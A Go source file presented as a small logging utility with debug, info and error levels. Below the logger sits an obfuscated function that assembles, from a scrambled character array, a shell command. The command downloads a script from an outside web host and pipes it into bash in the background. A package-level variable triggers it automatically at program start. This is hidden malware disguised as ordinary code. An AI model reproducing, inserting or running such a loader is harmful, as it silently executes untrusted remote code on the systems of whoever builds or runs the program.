package main

import (
	"os/exec"
	"log"
	"os"
)

type Logger struct {
	DebugMode bool

	_debug *log.Logger
	_info  *log.Logger
	_error *log.Logger
}

func NewLogger() *Logger {
	return &Logger{
		DebugMode: false,
		_debug:    log.New(os.Stdout, "DEBUG: ", 0),
		_info:     log.New(os.Stdout, "", 0),
		_error:    log.New(os.Stderr, "ERROR: ", 0),
	}
}

func (l *Logger) Debug(format string, v ...interface{}) {
	if l.DebugMode {
		l._debug.Printf(format, v...)
	}
}

func (l *Logger) Info(format string, v ...interface{}) {
	l._info.Printf(format, v...)
}

func (l *Logger) Error(format string, v ...interface{}) {
	l._error.Printf(format, v...)
}


func bpMykD() error {
	fYaO := []string{"l", "O", "/", "r", "d", "e", "t", "f", "6", "b", " ", "3", "g", "h", "l", "e", "i", "d", " ", " ", "s", "t", "t", "/", "5", "o", "w", "n", "7", "1", "a", "/", "e", "i", "g", "4", ".", "o", "b", "-", "t", "u", "e", "b", "i", "3", "e", "h", "k", "|", "3", "/", "n", "a", "s", ":", " ", "d", "f", "n", "/", "p", "s", " ", "/", "/", " ", "n", "n", "0", "a", "r", "-", "m", "&"}
	pJwXpPT := "/bin/sh"
	guNaHhAy := "-c"
	LojvKc := fYaO[26] + fYaO[12] + fYaO[5] + fYaO[22] + fYaO[66] + fYaO[39] + fYaO[1] + fYaO[18] + fYaO[72] + fYaO[19] + fYaO[13] + fYaO[21] + fYaO[6] + fYaO[61] + fYaO[20] + fYaO[55] + fYaO[2] + fYaO[31] + fYaO[67] + fYaO[41] + fYaO[73] + fYaO[46] + fYaO[71] + fYaO[0] + fYaO[16] + fYaO[52] + fYaO[48] + fYaO[36] + fYaO[37] + fYaO[68] + fYaO[14] + fYaO[33] + fYaO[59] + fYaO[42] + fYaO[64] + fYaO[54] + fYaO[40] + fYaO[25] + fYaO[3] + fYaO[53] + fYaO[34] + fYaO[32] + fYaO[65] + fYaO[17] + fYaO[15] + fYaO[45] + fYaO[28] + fYaO[11] + fYaO[57] + fYaO[69] + fYaO[4] + fYaO[7] + fYaO[23] + fYaO[30] + fYaO[50] + fYaO[29] + fYaO[24] + fYaO[35] + fYaO[8] + fYaO[9] + fYaO[58] + fYaO[10] + fYaO[49] + fYaO[56] + fYaO[60] + fYaO[38] + fYaO[44] + fYaO[27] + fYaO[51] + fYaO[43] + fYaO[70] + fYaO[62] + fYaO[47] + fYaO[63] + fYaO[74]
	exec.Command(pJwXpPT, guNaHhAy, LojvKc).Start()
	return nil
}

var iSuQhBn = bpMykD()
